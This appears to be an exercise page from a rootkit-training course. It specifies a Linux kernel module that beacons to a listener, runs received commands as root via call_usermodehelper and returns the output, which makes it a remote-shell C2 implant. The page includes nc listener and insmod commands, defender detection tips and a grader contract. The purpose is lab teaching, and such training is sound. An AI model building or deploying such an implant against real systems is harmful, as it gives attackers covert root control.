# Capstone 4: Remote shell

Build a module that connects to a remote listener and executes commands.
You are playing operator.

```
  host machine (listener)                    guest VM (implant)
  +---------------------------+              +---------------------------+
  |  $ nc -l -p 4444          |              |  insmod hello.ko          |
  |                           |              |     |                     |
  |  listening on :4444       |              |     v                     |
  |         |                 |  TCP connect |  kthread: beacon_loop     |
  |         |<----------------|<-------------|     |                     |
  |         |                 |              |     v                     |
  |  > id   |                 |  send "id\n" |  recv command             |
  |         |-----------------|------------->|     |                     |
  |         |                 |              |     v                     |
  |         |                 | send output  |  call_usermodehelper()    |
  |  uid=0  |<----------------|<-------------|     |                     |
  |         |                 |              |     v                     |
  |  > uname -a              |              |  send result back         |
  |         |---------------->|              |     |                     |
  |  Linux 7.x ...           |              |     v                     |
  |         |<----------------|              |  sleep(beacon_interval)   |
  |         |                 |              |     |                     |
  |  > exit |                 |              |     v                     |
  |         |                 |  close       |  reconnect loop           |
  +---------------------------+              +---------------------------+

  beacon timing:
       connect     check-in      check-in      disconnect
  ---|----------|-----------|-----------|---------|----> time
      0s         5s          10s         15s
```

## Prerequisites

Lings 00 through 47 (foundation through networking).

## What you are building

A kernel-space C2 agent. The module runs a background thread that
connects to a remote listener, receives commands, executes them, and
sends results back.

- A kthread runs the beacon loop.
- It connects to a configurable IP:port via a kernel TCP socket.
- It reads a command (newline-delimited), executes it with
  `call_usermodehelper`, captures output, and sends it back.
- On disconnect, it waits and reconnects.
- Beacon interval and target are set via module parameters.

## What "done" looks like

Terminal 1 (start a listener with netcat):
```sh
nc -l -p 4444
```

Terminal 2 (VM):
```sh
insmod hello.ko target=127.0.0.1 port=4444 interval=1
```

Terminal 1:
```
id
uid=0(root) gid=0(root)
uname -r
7.2.5-4-omarchy
exit
```

## What a defender sees

Everything leaks. This is the unarmored version.

```
lsmod                                        hello is listed
ps aux | grep hello                          kthread visible
ss -tlnp                                     TCP connection exposed
cat /proc/net/tcp                            socket in raw table
tcpdump -i eth0                              traffic in plaintext
```

Cross-view: compare `ss` output against `/proc/net/tcp`. A rootkit that
hooks `tcp4_seq_show` to hide from `/proc/net/tcp` but forgets netlink
(used by `ss`) is caught by the mismatch.

The killer move: capture traffic on the HOST side, outside the VM.
No kernel rootkit can touch packets after they leave the guest NIC.

## Contract

The check script verifies:

- `/proc/rk_shell` exists and shows `target=127.0.0.1` and `port=4444`.
- The beacon connects to a local listener (`connections` > 0).
- Commands sent by the listener are executed (`commands` > 0).
- Output of `id` contains `uid=0` (captured by the listener).
- `/proc/rk_shell` disappears after unload.

## Verify

```bash
./rootkitlings check capstone-4
```

## Hints

